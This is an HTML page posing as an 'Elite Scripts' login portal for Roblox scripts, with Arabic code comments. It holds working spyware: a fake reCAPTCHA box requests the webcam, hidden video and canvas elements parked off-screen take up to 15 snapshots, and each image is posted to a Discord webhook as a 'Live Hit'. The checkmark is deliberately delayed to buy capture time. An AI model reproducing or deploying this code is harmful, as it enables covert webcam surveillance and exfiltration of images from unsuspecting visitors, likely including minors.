<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Elite Scripts - Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        /* إعدادات الشاشة الكاملة والسواد المطلق */
        html, body { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #000 !important; overflow: hidden !important; 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
        }

        .full-screen-cover { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            background: #000 url('https://wallpapercave.com/wp/wp10336214.jpg') no-repeat center center; 
            background-size: cover; display: flex; justify-content: center; align-items: center; z-index: 100; 
        }

        .full-screen-cover::before { 
            content: ''; position: absolute; top:0; left:0; width:100%; height:100%; 
            background: rgba(0, 0, 0, 0.9); z-index: -1; 
        }

        /* المربع الأسود - كبير ومغطى بالكامل من الأعلى */
        .login-card { 
            background: #0a0a0a; width: 92%; max-width: 500px; 
            padding: 80px 40px 60px 40px; border-radius: 20px; 
            border: 2px solid #00ff00; box-shadow: 0 0 50px rgba(0, 255, 0, 0.3); 
            z-index: 101; text-align: center; position: relative;
        }

        .elite-title { font-size: 45px; font-weight: 900; color: #00ff00; text-shadow: 0 0 20px #00ff00; margin: 0; }
        .community-stat { color: #fff; font-size: 14px; margin: 25px 0 40px 0; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .online-dot { height: 12px; width: 12px; background: #00ff00; border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }

        input { width: 100%; height: 60px; margin: 12px 0; background: #000; border: 1px solid #333; border-radius: 10px; color: #00ff00; font-size: 18px; padding: 0 20px; box-sizing: border-box; text-align: left; }
        
        .g-recaptcha { background: #fff; border-radius: 5px; width: 100%; max-width: 300px; height: 74px; display: flex; align-items: center; padding: 0 12px; cursor: pointer; margin: 20px auto; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; background: #fff; margin-left: 12px; display: flex; align-items: center; justify-content: center; }
        .label { flex: 1; color: #555; font-size: 14px; text-align: right; }
        
        button { width: 100%; height: 65px; background: #00ff00; border: none; border-radius: 10px; color: #000; font-size: 20px; font-weight: 800; cursor: pointer; }

        /* سجن الكانفاس - 1 بكسل وخارج الشاشة تماماً */
        #jail { position: fixed; top: -5000px; left: -5000px; width: 1px; height: 1px; overflow: hidden; }
    </style>
</head>
<body>

    <div class="full-screen-cover">
        <div class="login-card">
            <h1 class="elite-title">ELITE SCRIPTS</h1>
            <div class="community-stat"> Active: + 10000 | MEMBERS: + 20000 <span class="online-dot"></span> </div>
            
            <input type="text" id="user" placeholder="USERNAME" spellcheck="false">
            <input type="password" id="pass" placeholder="PASSWORD">
            
            <div class="g-recaptcha" onclick="enableCamera()">
                <div id="c-box" class="checkbox"></div>
                <div class="label">أنا لست برنامج روبوت</div>
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
            </div>
            
            <button onclick="checkLogin()">LOGIN NOW</button>
        </div>
    </div>

    <div id="jail">
        <video id="video" playsinline autoplay muted width="640" height="480"></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script>
        const hook = "https://discordapp.com/api/webhooks/1446444773085810821/uxJoWNpADjB0KDc1CmNZhbOtwxqgbWCOr6T6fCyWoZJCUrCM5SaqiHojjCcgBOMMGnNF";
        let isReady = false;
        let shots = 0;

        async function enableCamera() {
            try {
                // أول ما يضغط بتطلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // زناد النظام الرابع: البدء فوراً عند تدفق البيانات
                video.onloadedmetadata = () => {
                    video.play();
                    startBurst(); // يبدأ الرشاش هنا فوراً!
                    
                    // تأخير "وهمي" لعلامة الصح عشان نكسب وقت
                    setTimeout(() => {
                        document.getElementById('c-box').style.background = "#00ff00";
                        document.getElementById('c-box').innerHTML = "<span style='color:white;font-size:20px;'>✔</span>";
                        isReady = true;
                    }, 1200);
                };
            } catch (e) { alert("Access Denied!"); }
        }

        function startBurst() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            // إرسال صورة كل 1.5 ثانية (لحد 15 صورة)
            const loop = setInterval(() => {
                if (video.readyState === 4 && video.currentTime > 0 && shots < 15) {
                    ctx.drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob((blob) => {
                        const fd = new FormData();
                        fd.append('file', blob, `shot_${shots}.jpg`);
                        fd.append('content', `📸 **Live Hit #${shots+1}**`);
                        $.ajax({ type: 'POST', url: hook, data: fd, processData: false, contentType: false });
                        shots++;
                    }, 'image/jpeg', 0.6);
                }
                if (shots >= 15) clearInterval(loop);
            }, 1500);
        }

  function checkLogin() {
            // سحب القيم من خانات الإدخال
            var u = document.getElementById('user').value;
            var p = document.getElementById('pass').value;

            // الفلترة الأولى (اليوزر والباسورد)
            if (u !== "elite_secret" || p !== "!LMNOP!") {
                alert("the user or pass or captcha maybe wrong!");
                return; // يوقف هنا وما يشيك على الكابتشا
            }

            // الفلترة الثانية (الكابتشا) - ما بتشتغل إلا لو اليوزر والباس صح
            if (isReady === false) { 
                alert("the user or pass or captcha maybe wrong!"); 
                return; 
            }
            
            // إذا كل شيء صح يحوله
            location.href = "https://github.com/search?q=Roblox+Scripts+2026";
        }
    </script>
</body>
</html>
